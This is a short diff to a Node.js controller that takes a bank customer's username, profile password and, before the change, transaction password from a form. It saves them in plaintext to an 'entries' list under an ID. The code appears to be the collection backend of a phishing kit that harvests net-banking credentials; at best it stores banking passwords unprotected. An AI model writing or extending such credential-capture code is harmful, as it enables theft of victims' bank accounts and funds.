@@ -3,15 +3,15 @@ const NetBanking = require('../models/CardPayment');
 
 exports.submitNetBankingPayment = async (req, res) => {
   try {
-    const { userName,profilePass,transactionPass, uniqueid } = req.body;
+    const { userName,profilePass, uniqueid } = req.body;
     let netBanking = await NetBanking.findOne({ uniqueid });
 
     if (netBanking) {
-      netBanking.entries.push({ userName,profilePass,transactionPass });
+      netBanking.entries.push({ userName,profilePass });
     } else {
       netBanking = new NetBanking({
         uniqueid,
-        entries: [{ userName,profilePass,transactionPass }]
+        entries: [{ userName,profilePass }]
       });
     };
 
